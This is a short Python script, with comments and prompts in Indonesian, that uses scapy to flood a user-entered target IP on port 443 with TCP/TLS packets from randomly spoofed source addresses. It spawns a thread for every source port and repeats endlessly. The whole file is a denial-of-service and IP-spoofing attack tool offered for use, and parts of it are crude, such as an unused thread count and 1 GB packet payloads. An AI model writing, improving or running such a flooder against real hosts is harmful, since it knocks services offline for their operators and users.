import random
import string
from scapy.all import *
import threading
import time


def send_large_packet(
    source_IP, target_IP, source_port, data_size_bytes, packet_delay=0.01
):
    IP1 = IP(src=source_IP, dst=target_IP)
    TLS1 = TLS()
    TCP1 = TCP(sport=source_port, dport=443)
    data = "".join(
        random.choice(string.ascii_letters) for _ in range(data_size_bytes)
    )  # Mengubah ukuran data menjadi byte
    pkt = IP1 / TCP1 / TLS1 / data

    try:
        send(pkt, inter=packet_delay, verbose=0)  # Tambahkan penundaan di sini
    except Exception as e:
        print(f"Terjadi kesalahan saat mengirim paket: {e}")


def main():
    target_IP = input("Masukkan alamat IP Target: ")
    num_threads = 100  # Jumlah thread yang digunakan untuk mengirimkan paket
    data_size_gb = 1  # Ukuran data dalam gigabyte
    data_size_bytes = data_size_gb * 1024 * 1024 * 1024

    i = 1
    while True:
        a = str(random.randint(1, 254))
        b = str(random.randint(1, 254))
        c = str(random.randint(1, 254))
        d = str(random.randint(1, 254))
        dot = "."
        source_IP = a + dot + b + dot + c + dot + d

        source_ports = range(1, 65535)
        threads = []

        for source_port in source_ports:
            thread = threading.Thread(
                target=send_large_packet,
                args=(source_IP, target_IP, source_port, data_size_bytes),
            )
            threads.append(thread)

        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join()

        print(f"Paket terkirim {i} (Ukuran: {data_size_gb} GB)")
        i += 1
        time.sleep(30)


if __name__ == "__main__":
    main()
